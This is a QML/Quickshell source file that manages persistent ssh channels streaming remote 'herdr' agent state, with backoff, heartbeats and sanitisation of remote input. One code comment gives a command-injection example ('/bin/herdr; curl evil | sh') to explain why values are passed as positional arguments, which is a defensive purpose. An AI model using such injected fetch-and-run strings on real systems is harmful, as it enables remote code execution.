import QtQuick
import Quickshell
import Quickshell.Io
import "Reachability.js" as Reachability

// One long-lived ssh channel per remote host, streaming herdr state.
//
// Why a channel rather than polling on a timer: measured on real hardware, a
// per-poll `ssh host herdr api snapshot` costs ~4.5ms of local client CPU and
// wakes the radio every interval, forever. This costs 0ms over 26s and sends
// bytes only when state actually changes — the remote polls its own unix
// socket, where there is no crypto and no network.
//
// Three invariants this file depends on, each verified rather than assumed:
//
//  * `ControlMaster=no` on every ssh we spawn. `auto` means "use a master,
//    otherwise BECOME one" — and a Quickshell reload SIGKILLs our processes,
//    so becoming the master means reload kills the master itself, which
//    ControlPersist cannot save because the persisting process is the corpse.
//    With this flag the master is always the user's, and re-attaching after a
//    reload costs ~48ms.
//
//  * `running = true` on an already-running Process is a NO-OP (early-return
//    guard in Quickshell). Respawn must go through onExited and a Timer;
//    toggling the property silently does nothing.
//
//  * The remote loop suicides on a failed write, bounded by its heartbeat.
//    See bin/kettle-herdr-stream.sh — without that, every reload would leak a
//    loop polling herdr forever.
QtObject {
  id: root

  required property string host
  property string pluginDir: ""

  // Absolute path to herdr on the remote, discovered at install. Empty means
  // herdr was not found there — the channel would only ever emit "down", so
  // it is not worth opening.
  property string herdrPath: ""
  // Deliberately no `store` property: naming it `store` here shadowed the
  // Panel's PotStore id inside the delegate, so `store: store` bound the
  // property to itself and every snapshot went nowhere. The poller emits
  // signals; the delegate decides where they land.

  // Only run while the user already holds a connection. `ssh -O check` asks
  // the local mux socket and touches no network, so this is a free probe.
  property bool masterAlive: false

  property bool desiredRunning: false
  property bool streaming: false
  property bool stale: false

  // Released after sustained emptiness. Distinct from !desiredRunning: intent
  // is unchanged, so any sign of life re-opens the channel.
  property bool idling: false

  // How long a host may be unreachable before its pots are dropped. Retrying
  // forever while showing stale pots is the failure mode that matters most.
  readonly property int lostAfterMs: 120000
  property double unreachableSince: 0
  // Edge, not level: the drop happens once per outage. See Reachability.js.
  property bool lostFired: false

  // The reachability state machine lives in Reachability.js so the suite can
  // exercise it without standing up a poller and its ssh processes; these two
  // move it in and out of the properties the rest of the file reads.
  function reachState() {
    return {streaming: streaming, unreachableSince: unreachableSince,
            lostFired: lostFired, lostAfterMs: lostAfterMs}
  }
  function applyReach(s) {
    streaming = s.streaming
    unreachableSince = s.unreachableSince
    lostFired = s.lostFired
  }

  // Backoff, autossh's shape: a channel that dies within the gate is treated
  // as a persistent failure rather than something to retry tightly.
  readonly property int gateMs: 30000
  readonly property int backoffMinMs: 1000
  readonly property int backoffMaxMs: 60000
  property int backoffMs: backoffMinMs
  property double startedAt: 0

  readonly property int heartbeatMs: 30000
  property double lastLine: 0

  // Teardown after sustained emptiness so we stop pinning the user's master.
  readonly property int idleTeardownMs: 600000
  property double emptySince: 0

  // NOT `agentsChanged` — QML reserves <prop>Changed for property signals.
  signal snapshotAgents(var list)
  signal down()
  // Raised when this host has been unreachable long enough that its pots can
  // no longer be trusted. A status widget showing stale state is worse than
  // one showing nothing.
  signal lost()

  function log(msg) { console.warn("kettle[" + host + "]: " + msg) }

  // ---- lifecycle ----------------------------------------------------------
  // `desiredRunning` is intent; `canRun` is capability. Separating them fixes
  // a startup race: herdrPath arrives asynchronously from the token loader, so
  // at Component.onCompleted it is still empty. Refusing to start there would
  // strand the channel until something else nudged it.
  readonly property bool canRun: masterAlive && herdrPath.length > 0 && !idling

  function start() { desiredRunning = true }
  onCanRunChanged: {
    if (canRun && desiredRunning && !chan.running && !retry.running) chan.running = true
    else if (!canRun && chan.running) chan.running = false
  }

  function stop() {
    desiredRunning = false
    retry.stop()
    if (chan.running) chan.running = false     // SIGTERM; onExited follows
  }

  function handleLine(raw) {
    var line = String(raw || "").trim()
    if (line.length === 0) return
    lastLine = Date.now()
    if (stale) { stale = false; log("recovered") }

    if (line === "H") return                    // heartbeat: liveness only
    if (line === "D") { root.down(); return }   // herdr itself is gone

    if (line.charAt(0) !== "S" || line.charAt(1) !== " ") return
    var payload
    try {
      payload = JSON.parse(Qt.atob(line.slice(2)))
    } catch (e) {
      log("undecodable payload, dropping")
      return
    }
    if (!payload || !Array.isArray(payload.agents)) return

    // Same trust boundary as the relay: this is remote-controlled input.
    var clean = []
    for (var i = 0; i < payload.agents.length && i < 64; i++) {
      var a = payload.agents[i]
      if (!a || typeof a !== "object") continue
      var id = String(a.id || "")
      if (!/^[A-Za-z0-9:_-]{1,64}$/.test(id)) continue
      clean.push({
        pane_id: id,
        agent: String(a.agent || "").slice(0, 32),
        agent_status: String(a.state || "").slice(0, 16),
        cwd: String(a.cwd || "").slice(0, 512),
        terminal_title_stripped: String(a.title || "").slice(0, 120),
        name: String(a.name || "").slice(0, 64),
        state_change_seq: Number(a.seq)
      })
    }

    if (clean.length === 0) {
      if (emptySince === 0) emptySince = Date.now()
    } else {
      emptySince = 0
    }
    root.snapshotAgents(clean)
  }

  property Process chan: Process {
    // stdout passes through the line guard so a remote emitting megabytes
    // without a newline kills a disposable child rather than growing the
    // shell's heap — SplitParser has no buffer cap.
    // Values are passed as POSITIONAL ARGUMENTS, never interpolated into the
    // script text. herdrPath in particular is probed from the remote host, so
    // interpolating it would hand a compromised host code execution here —
    // `command -v herdr` returning "/bin/herdr; curl evil | sh" would run.
    // The host name comes from a token filename and deserves the same care.
    command: [
      "bash", "-c",
      'ssh -o BatchMode=yes -o ControlMaster=no -o ControlPath="$HOME/.ssh/cm-%r@%h:%p" ' +
      '-o ServerAliveInterval=30 -o ServerAliveCountMax=2 -o ConnectTimeout=10 ' +
      '-- "$1" "KETTLE_HERDR=$2 bash -s" < "$3" | "$4"',
      "kettle-channel",           // $0
      root.host,                  // $1
      root.herdrPath,             // $2
      root.pluginDir + "bin/kettle-herdr-stream.sh",
      root.pluginDir + "bin/kettle-line-guard"
    ]

    stdout: SplitParser { onRead: function(line) { root.handleLine(line) } }
    stderr: SplitParser {
      onRead: function(line) {
        var s = String(line).trim()
        if (s.length > 0) root.log("ssh: " + s.slice(0, 160))
      }
    }

    onStarted: {
      // A started channel is the only evidence the host is back, so this is
      // also where the drop latch is released.
      root.applyReach(Reachability.reachable(root.reachState()))
      root.startedAt = Date.now()
      root.lastLine = Date.now()
    }

    onExited: function(code, status) {
      root.applyReach(Reachability.unreachable(root.reachState(), Date.now()))
      var lived = Date.now() - root.startedAt

      // Lived past the gate: treat as a transient drop and retry promptly.
      // Died inside it: something is persistently wrong, so back off hard.
      if (lived > root.gateMs) root.backoffMs = root.backoffMinMs
      else root.backoffMs = Math.min(root.backoffMs * 2, root.backoffMaxMs)

      if (!root.desiredRunning) return
      // Jitter so several hosts recovering together do not synchronise.
      retry.interval = Math.round(root.backoffMs * (0.8 + Math.random() * 0.4))
      retry.restart()
    }
  }

  property Timer retry: Timer {
    repeat: false
    onTriggered: {
      if (!root.desiredRunning || !root.canRun) return
      if (!root.chan.running) root.chan.running = true
    }
  }

  // Cheap local probe: is the user still connected to this host?
  property Process check: Process {
    command: ["ssh", "-o", "ControlPath=" + Quickshell.env("HOME") + "/.ssh/cm-%r@%h:%p",
              "-O", "check", "--", root.host]
    onExited: function(code) {
      var alive = (code === 0)
      if (alive !== root.masterAlive) {
        root.masterAlive = alive
        root.log(alive ? "master up" : "master gone")
      }
      if (!root.canRun && root.chan.running) root.chan.running = false
      else if (root.canRun && root.desiredRunning && !root.chan.running && !root.retry.running)
        root.chan.running = true
    }
  }

  // One-shot probe while idling: does this host have agents again? Costs one
  // multiplexed round trip a minute, and only while released.
  property Process wake: Process {
    command: ["ssh", "-o", "BatchMode=yes", "-o", "ControlMaster=no",
              "-o", "ControlPath=" + Quickshell.env("HOME") + "/.ssh/cm-%r@%h:%p",
              "-o", "ConnectTimeout=8", "--", root.host,
              (root.herdrPath || "herdr") + " agent list"]
    stdout: StdioCollector {
      waitForEnd: true
      onStreamFinished: {
        try {
          var d = JSON.parse(String(text || "{}"))
          var list = (d.result && d.result.agents) ? d.result.agents : []
          var live = list.filter(function(a) {
            return a && a.agent_status && a.agent_status !== "idle"
          })
          if (live.length > 0) {
            root.log("agents active again, re-opening channel")
            root.idling = false
          }
        } catch (e) { /* unreachable or malformed: stay idle */ }
      }
    }
  }

  property Timer supervisor: Timer {
    interval: 5000
    running: true
    repeat: true
    onTriggered: {
      if (!root.check.running) root.check.running = true

      // A host that is partitioned, suspended, or asleep emits neither a
      // snapshot nor a down marker — so neither reconcile nor `down` can
      // clear its pots. Without this they would sit on the bar, possibly
      // still ticking as "simmering", until the shell reloaded.
      var gate = Reachability.lostGate(root.reachState(), Date.now())
      if (gate.fire) {
        root.log("unreachable for 2m, dropping its pots")
        root.lost()
      }
      root.lostFired = gate.lostFired

      // Any sign of life ends an idle release.
      if (root.idling && root.masterAlive && root.herdrPath.length > 0) {
        // Cheap re-probe: if the host has agents again, re-open.
        if (!root.wake.running) root.wake.running = true
      }

      // Capability may have arrived after start(); pick it up here too.
      if (root.desiredRunning && root.canRun && !root.chan.running && !root.retry.running)
        root.chan.running = true
      if (!root.streaming) return

      // Silence is ambiguous: a quiet channel and a dead one look identical
      // from here, so missed heartbeats are the only staleness signal.
      var since = Date.now() - root.lastLine
      if (since > root.heartbeatMs * 2) {
        if (!root.stale) { root.stale = true; root.log("stale, no heartbeat") }
        if (since > root.heartbeatMs * 3) {
          root.log("heartbeat lost, cycling channel")
          root.chan.running = false      // onExited drives the respawn
        }
      }

      // Stop pinning the user's ControlMaster when there is nothing to watch.
      // `idle` is a RELEASE, not a shutdown: desiredRunning stays true so the
      // capability signals re-open the channel the moment the host is usable
      // again. Clearing desiredRunning here would silently kill the feature
      // for the rest of the shell's life.
      if (root.emptySince > 0 && Date.now() - root.emptySince > root.idleTeardownMs) {
        root.log("no agents for 10m, releasing channel")
        root.idling = true
        root.emptySince = 0
        if (root.chan.running) root.chan.running = false
      }
    }
  }
}
